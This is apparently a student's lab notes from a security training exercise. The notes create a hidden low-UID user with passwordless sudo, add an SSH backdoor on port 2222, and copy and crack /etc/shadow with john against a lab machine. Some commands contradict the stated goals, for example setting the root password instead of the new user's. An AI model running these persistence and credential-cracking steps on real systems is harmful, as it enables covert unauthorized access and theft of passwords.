Advanced Bash 

STEP 1: Shadow People

Create a secret user named sysd. Make sure this user doesn't have a home folder created:
sudo useradd -m sysd

Give you secret user a password
sudo passwd root 

Give your secret user a UID < 1000 
usermod -u 666 sysd

Give you secret user the same GID
groupmod -g 666 sysd

Give your secret user full sudo access without the need for a password
sudo visudo
Under #includedir /etc/sudoers.d 
sysd ALL=(ALL) NOPASSWD:ALL

Test that sudo access works without your password
sudo -l    was successful. No prompt for password.
Examples: sudo -v   no warning for sudo password asked
sudo visudo       did not prompt a password

STEP 2: Smooth Sailing

Edit the ssh_config file
nano /etc/ssh/sshd_config
Under #Port 22 added Port 2222

STEP 3: Testing Your Configuration Update

Restart the ssh service
sudo systemctl restart ssh.service

Exit the root account
exit 
exit    connection to 192.168â€¦closed 

SSH to the target machine using your sysd account and port 2222
ssh sysd@192.168.6.105 -p 2222
Password prompt 
Successful backdoor

Use sudo to switch to root user
sudo su
Line now reads: root@scavenger-hunt:/home/sysd# 

STEP 4: Crack all The Passwords

SSH back into the system using you sysd account and port 2222
ssh sysd@192.168.6.105 -p 2222

Escalate your privileges to the root user. Use john to crack the entire etc/shadow file:
Step 1: cp /etc/shadow  /home/sysd/Documents
Step 2: mv shadow shadow.txt
Step 3: john shadow.txt
Step 4: verified cracked passwords   john - -show shadow.txt
